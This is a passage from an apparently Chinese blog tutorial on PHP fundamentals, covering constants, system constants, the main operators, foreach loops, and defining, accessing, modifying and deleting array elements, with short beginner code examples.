title="常量的作用："></a>常量的作用：</h2><p>常量主要功效是可以避免重复定义，篡改变量值。在我们进行团队开发时，或者代码量很大的时候，对于一些第一次定义后不改变的量，如果我们使用变量，在不知情的情况下，使用同一变量名时，变量值就会被替换掉，从而会引发服务器执行错误的任务。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;PI&quot;</span>,<span class="number">3.14</span>);</span><br><span class="line">$r=<span class="number">3</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;面积为:&quot;</span>.(PI*$r*$r).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;周长为:&quot;</span>.(<span class="number">2</span>*PI*$r).<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以重复使用。</p><h2 id="特殊的常量——系统常量"><a href="#特殊的常量——系统常量" class="headerlink" title="特殊的常量——系统常量"></a>特殊的常量——系统常量</h2><p>系统常量是PHP已经定义好的常量，我们可以直接拿来使用<br>（1）<strong>FILE</strong> :php程序文件名。它可以帮助我们获取当前文件在服务器的物理位置。</p><p>（2）<strong>LINE</strong> :PHP程序文件行数。它可以告诉我们，当前代码在第几行。</p><p>（3）PHP_VERSION:当前解析器的版本号。它可以告诉我们当前PHP解析器的版本号，我们可以提前知道我们的PHP代码是否可被该PHP解析器解析。</p><p>（4）PHP_OS：执行当前PHP版本的操作系统名称。它可以告诉我们服务器所用的操作系统名称，我们可以根据该操作系统优化我们的代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> |<span class="meta">&lt;?php</span></span><br><span class="line"><span class="number">2</span> |<span class="keyword">echo</span> <span class="keyword">__FILE__</span>;</span><br><span class="line"><span class="number">3</span> |<span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="number">4</span> |<span class="keyword">echo</span> <span class="keyword">__LINE__</span>;</span><br><span class="line"><span class="number">5</span> |<span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="number">6</span> |<span class="keyword">echo</span> PHP_VERSION;</span><br><span class="line"><span class="number">7</span> |<span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="number">8</span> |<span class="keyword">echo</span> PHP_OS;</span><br><span class="line"><span class="number">9</span> |<span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="number">10</span>|<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317204248515.png" alt="Augenstern" loading="lazy"></p><h2 id="常量取值"><a href="#常量取值" class="headerlink" title="常量取值"></a>常量取值</h2><p>获取常量值的有两种方法取值。第一种是使用常量名直接获取值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;PI&quot;</span>,<span class="number">3.14</span>);</span><br><span class="line">$r=<span class="number">1</span>;</span><br><span class="line">$area = PI*$r*$r; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>计算圆的面积。<br>第二种是使用constant()函数。它和直接使用常量名输出的效果是一样的，但函数可以动态的输出不同的常量，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed constant(<span class="keyword">string</span> constant_name)</span><br></pre></td></tr></table></figure><p>（注：mixed表示函数返回值类型为多种不同的类型，string表示参数类型为字符串类型）<br>同样是计算圆的面积：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(<span class="string">&quot;PI&quot;</span>,<span class="number">3.14</span>);</span><br><span class="line">$r=<span class="number">1</span>;</span><br><span class="line">$area = constant(<span class="string">&quot;PI&quot;</span>)*$r*$r;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="如何判断一个常量是否被定义"><a href="#如何判断一个常量是否被定义" class="headerlink" title="如何判断一个常量是否被定义"></a>如何判断一个常量是否被定义</h2><p>如果常量被重复定义以后，PHP解析器会发出“<code>Constant XXX already defined</code>”的警告，提醒我们该常量已经被定义过。<br>defined()函数可以帮助我们判断一个常量是否已经定义，其语法格式为：<code>bool defined(string constants_name)</code><br>它只有参数<code>constant_name</code>，指的是要获取常量的名称，若存在则返回布尔类型<strong>true</strong>，否则返回布尔类型<strong>false</strong>; （注：bool表示函数返回值类型为<strong>布尔类型</strong>）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">define(<span class="string">&quot;PI1&quot;</span>,<span class="number">3.14</span>);</span><br><span class="line">$p = <span class="string">&quot;PI1&quot;</span>;</span><br><span class="line">$is1 = defined($p);</span><br><span class="line">$is2 = defined(<span class="string">&quot;PI2&quot;</span>);</span><br><span class="line">var_dump($is1);</span><br><span class="line">var_dump($is2);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200317211359730.png" alt="Augenstern" loading="lazy"></p><h1 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h1><p>PHP运算符一般分为算术运算符、赋值运算符、比较运算符、三元运算符、逻辑运算符、字符串连接运算符、错误控制运算符。<br>算术运算符：<br><img src="https://img-blog.csdnimg.cn/20200317211952236.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><p>PHP的赋值运算符有两种，分别是：</p><p>(1)“=”：把右边表达式的值赋给左边的运算数。它将右边表达式值复制一份，交给左边的运算数。换而言之，首先给左边的运算数申请了一块内存，然后把复制的值放到这个内存中。</p><p>(2)“&amp;”：引用赋值，意味着两个变量都指向同一个数据。它将使两个变量共享一块内存，如果这个内存存储的数据变了，那么两个变量的值都会发生变化。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a = <span class="string">&quot;我的博客&quot;</span>;</span><br><span class="line">$b = $a;</span><br><span class="line">$c = &amp;$a;</span><br><span class="line">$a = <span class="string">&quot;https://zxcv0221.github.io&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $c.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317212552557.png" alt="Augenstern" loading="lazy"></p><h2 id="比较运算符："><a href="#比较运算符：" class="headerlink" title="比较运算符："></a>比较运算符：</h2><p><img src="https://img-blog.csdnimg.cn/20200317212701414.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>示例如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">    $a = <span class="number">1</span>;</span><br><span class="line">$b = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">var_dump($a == $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a === $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a != $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a &lt;&gt; $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a !== $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a &lt; $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">$c = <span class="number">5</span>;</span><br><span class="line">var_dump($a &lt; $c);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a &gt; $c);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a &lt;= $c);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a &gt;= $c);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">var_dump($a &gt;= $b);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果如下：<br><img src="https://img-blog.csdnimg.cn/20200317213238624.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"></p><h2 id="三元运算符："><a href="#三元运算符：" class="headerlink" title="三元运算符："></a>三元运算符：</h2><p>(“?:”)三元运算符也是一个比较运算符，对于表达式(expr1)?(expr2):(expr3)，如果expr1的值为true，则此表达式的值为expr2，否则为expr3。看代码就更清楚了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a = <span class="number">78</span>;<span class="comment">//成绩</span></span><br><span class="line">$b = $a &gt;= <span class="number">60</span>?<span class="string">&quot;及格&quot;</span>:<span class="string">&quot;不及格&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果当然是<code>及格</code>。<br>逻辑运算符：<br>逻辑运算符主用是进行逻辑运算的，例如：逻辑与、逻辑或、逻辑异或、逻辑非等，在PHP中常用的逻辑运算符如下表：<br><img src="https://img-blog.csdnimg.cn/20200317213806578.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="Augenstern" loading="lazy"><br>我们可以从投票的角度来理解逻辑运算：</p><p>1、逻辑与：要求所有人都投票同意，才会通过某协议；</p><p>2、逻辑或：只要求一个人投票同意就行；</p><p>3、逻辑异或：只能有且只能有一个人投票同意；</p><p>4、逻辑非：某个人要反对，但是通过逻辑非，使其反对无效；</p><p>“与”和“或”有两种不同形式运算符的原因是它们运算的优先级（就是运算的有限顺序，比如我们小学的时候学习四则运算，加减乘除混合在一起啦，优先计算乘除，再计算加减）不同。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a = <span class="literal">TRUE</span>; <span class="comment">//A同意</span></span><br><span class="line">$b = <span class="literal">TRUE</span>; <span class="comment">//B同意</span></span><br><span class="line">$c = <span class="literal">FALSE</span>; <span class="comment">//C反对</span></span><br><span class="line">$d = <span class="literal">FALSE</span>; <span class="comment">//D反对</span></span><br><span class="line"><span class="comment">//顺便复习下三元运算符</span></span><br><span class="line"><span class="keyword">echo</span> ($a <span class="keyword">and</span> $b)?<span class="string">&quot;通过&quot;</span>:<span class="string">&quot;不通过&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> ($a <span class="keyword">or</span> $c)?<span class="string">&quot;通过&quot;</span>:<span class="string">&quot;不通过&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> ($a <span class="keyword">xor</span> $c <span class="keyword">xor</span> $d)?<span class="string">&quot;通过&quot;</span>:<span class="string">&quot;不通过&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> !$c?<span class="string">&quot;通过&quot;</span>:<span class="string">&quot;不通过&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> ($a &amp;&amp; $d)?<span class="string">&quot;通过&quot;</span>:<span class="string">&quot;不通过&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> $b || $c || $d?<span class="string">&quot;通过&quot;</span>:<span class="string">&quot;不通过&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/2020031721574420.png" alt="Augenstern" loading="lazy"></p><h2 id="连接运算符"><a href="#连接运算符" class="headerlink" title="连接运算符"></a>连接运算符</h2><p>字符串连接运算符是为了将两个字符串进行连接，PHP中提供的字符串连接运算符有：<br>（1）连接运算符(“.”)：它返回将右参数附加到左参数后面所得的字符串。<br>（2）连接赋值运算符(“.=”)：它将右边参数附加到左边的参数后。</p><p>示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    $a = <span class="string">&quot;这位大佬&quot;</span>;</span><br><span class="line">$tip = $a.<span class="string">&quot;，欢迎您指点我的博客！&quot;</span>;</span><br><span class="line">    $b = <span class="string">&quot;我自横刀向天笑&quot;</span>;</span><br><span class="line">    $b .=<span class="string">&quot;去留肝胆两昆仑&quot;</span>;</span><br><span class="line">$c = <span class="string">&quot;将进酒&quot;</span>;</span><br><span class="line">    $c = $c.<span class="string">&quot;杯莫停！&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  $tip.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  $b.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  $c.<span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/20200317220631112.png" alt="Augenstern" loading="lazy"></p><h2 id="取模运算符"><a href="#取模运算符" class="headerlink" title="取模运算符"></a>取模运算符</h2><p>直接看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">     $maxLine = <span class="number">4</span>; <span class="comment">//每排人数</span></span><br><span class="line"> $no = <span class="number">17</span>;<span class="comment">//学生编号</span></span><br><span class="line">     $line = ceil($no / $maxLine);</span><br><span class="line"> $row = $no % $maxLine ? $no % $maxLine : $maxLine;</span><br><span class="line"> <span class="keyword">echo</span> <span class="string">&quot;编号&lt;b&gt;&quot;</span>.$no.<span class="string">&quot;&lt;/b&gt;的座位在第&lt;b&gt;&quot;</span>.$line.<span class="string">&quot;&lt;/b&gt;排第&lt;b&gt;&quot;</span>.$row.<span class="string">&quot;&lt;/b&gt;个位置&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20200317221705779.png" alt="Augenstern" loading="lazy"></p><h1 id="foreach语句"><a href="#foreach语句" class="headerlink" title="foreach语句"></a>foreach语句</h1><p>在PHP中foreach循环语句，常用于遍历数组（下面介绍，这里主要看这个语句的用法），一般有两种使用方式:不取下标、取下标。<br>（1）只取值，不取下标</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="keyword">foreach</span> (数组 <span class="keyword">as</span> 值)&#123;</span><br><span class="line"><span class="comment">//执行的任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>（2）同时取下标和值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">foreach</span> (数组 <span class="keyword">as</span> 下标 =&gt; 值)&#123;</span><br><span class="line"> <span class="comment">//执行的任务</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>写个示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$books = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">&#x27;2010&#x27;</span>=&gt;<span class="string">&#x27;鬼谷子&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2011&#x27;</span>=&gt;<span class="string">&#x27;人性的弱点&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2012&#x27;</span>=&gt;<span class="string">&#x27;狼道&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2013&#x27;</span>=&gt;<span class="string">&#x27;莫非定律&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2014&#x27;</span>=&gt;<span class="string">&#x27;山海经&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2015&#x27;</span>=&gt;<span class="string">&#x27;红楼梦&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2016&#x27;</span>=&gt;<span class="string">&#x27;西游记&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2017&#x27;</span>=&gt;<span class="string">&#x27;水浒传&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2018&#x27;</span>=&gt;<span class="string">&#x27;三国演义&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;2019&#x27;</span>=&gt;<span class="string">&#x27;金瓶梅嘿嘿&#x27;</span>,</span><br><span class="line">);<span class="comment">//10本书的编号和书名，用数组存储</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//使用循环结构遍历数组,获取编号和书名  </span></span><br><span class="line"><span class="keyword">foreach</span>($books <span class="keyword">as</span>  $v)<span class="comment">//foreach($students as $key =&gt; $v)只需在这里把代码改成这样即可</span></span><br><span class="line">&#123; </span><br><span class="line">    <span class="keyword">echo</span> $v;<span class="comment">//输出（打印）书名</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>至于数组 ，后面介绍。先看最后几行代码。<img src="https://img-blog.csdnimg.cn/20200320235117175.png" alt="Augenstern" loading="lazy"><br>取下标的自行实现。</p><hr><p>说明：我以前使用浏览器编译代码，现在换编译软件了，所以我从现在往后面所学的都会是源码运行，PHP里面浏览器编译和源码还是不一样的，举个栗子：浏览器里面编译，换行符是<code>&lt;br /&gt;</code>，而源码里面的换行却是<code>\n</code>与C语言有点相似。</p><h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><p>数组就简单介绍一下：<br>定义一个数组：array()<br>可以用array()来新建一个数组，它接受任意数量的用逗号分隔的(key)=&gt;(value)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>( key =&gt; value</span><br><span class="line">……</span><br><span class="line">)</span><br><span class="line"><span class="comment">//key可以是一个整数int，或字符串string</span></span><br><span class="line"><span class="comment">//value可以是任意类型的值。</span></span><br></pre></td></tr></table></figure><p>最后一个数组单元的逗号可以省去<br>看个定义一个数组的例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;lxj&quot;</span> =&gt; <span class="string">&quot;lalala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wkx&quot;</span> =&gt; <span class="string">&quot;xixixi&quot;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">//两种方法</span></span><br><span class="line">$array = [</span><br><span class="line">    <span class="string">&quot;lxj&quot;</span> =&gt; <span class="string">&quot;lalala&quot;</span>,</span><br><span class="line">    <span class="string">&quot;wkx&quot;</span> =&gt; <span class="string">&quot;xixix&quot;</span>,</span><br><span class="line">];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第二种方法我专门去查了一下，这个PHP官方手册解释的是自PHP 5.4 起可以用这种方法的，短数组定义方法。</p><h2 id="关于key"><a href="#关于key" class="headerlink" title="关于key"></a>关于key</h2><p>1.包含有合法的整数型字符串会被转换为整型，如“8”，会被存储为8。但是“08”不会被强制转换。因为他不是一个合法的十进制数。<br>2.浮点数也会被转换成整型。小数点后面的会被舍去。注意是舍去，不是四舍五入，而是全部扔了不要（哈哈，真浪费）。<br>3.布尔类型的也会被转换成整型，true被存储为1，而false被存储为0.<br>4.NULL会被转换为空字符串，null实际上会被存储为“  ”。<br>接着说数组：<br>如果在定义一个数组时多个单元都使用了同一个key，那么就会只使用最后一个，之前的都会被覆盖，看个代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="comment">//这个代码同时反映类型强制和覆盖</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="number">1</span> =&gt; <span class="string">&quot;mary&quot;</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span> =&gt; <span class="string">&quot;jack&quot;</span>,</span><br><span class="line">    <span class="number">1.5</span> =&gt; <span class="string">&quot;rose&quot;</span>,</span><br><span class="line">    <span class="literal">true</span> =&gt; <span class="string">&quot;lxj&quot;</span></span><br><span class="line">);</span><br><span class="line">var_dump($array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>结果呢，只会有lxj<br><img src="https://img-blog.csdnimg.cn/20200328130625744.png" alt="Augenstern" loading="lazy"><br>PHP数组还可以有混合key的，就是数组里的变量既有整型，也有字符串。代码就不写了。也没什么可举例子的。</p><h2 id="数组的访问"><a href="#数组的访问" class="headerlink" title="数组的访问"></a>数组的访问</h2><p>通过语法：数组名[key]<br>没有什么是代码解释不清的。代码上：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$array = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;lxj&quot;</span> =&gt; <span class="string">&quot;Augenstern&quot;</span>,</span><br><span class="line">    <span class="number">0258</span> =&gt; <span class="number">8520</span></span><br><span class="line">);</span><br><span class="line">var_dump($array[<span class="string">&quot;lxj&quot;</span>]);</span><br><span class="line">var_dump($array[<span class="number">0258</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这个输出的就是<br><img src="https://img-blog.csdnimg.cn/20200328131731978.png" alt="Augenstern" loading="lazy"><br>tip：方括号和花括号能在这里互换使用，达到同样的效果。赶紧试一下去。</p><h2 id="增加、修改、删除数组里的值"><a href="#增加、修改、删除数组里的值" class="headerlink" title="增加、修改、删除数组里的值"></a>增加、修改、删除数组里的值</h2><p>这里用一个代码就能看出怎么玩了：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;lxj&quot;</span> =&gt; <span class="string">&quot;Augenstern&quot;</span>,</span><br><span class="line">    <span class="number">0258</span> =&gt; <span class="number">8520</span>,</span><br><span class="line">);</span><br><span class="line">$arr[<span class="string">&quot;lxj&quot;</span>] = <span class="string">&quot;zxcv0221&quot;</span>;<span class="comment">//修改数组值</span></span><br><span class="line">$arr[<span class="string">&quot;wkx&quot;</span>] = <span class="string">&quot;wangkaixin&quot;</span>;<span class="comment">//增加一个数组值</span></span><br><span class="line"><span class="keyword">unset</span>($arr[<span class="string">&quot;wkx&quot;</span>]);<span class="comment">//删除wkx这个key和其对应的值</span></span><br><span class="line"><span class="keyword">unset</span>($arr);<span class="comment">//删除整个数组</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>清晰明了。数组学习暂时到这里。</p><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="用户自定义函数"><a href="#用户自定义函数" class="headerlink" 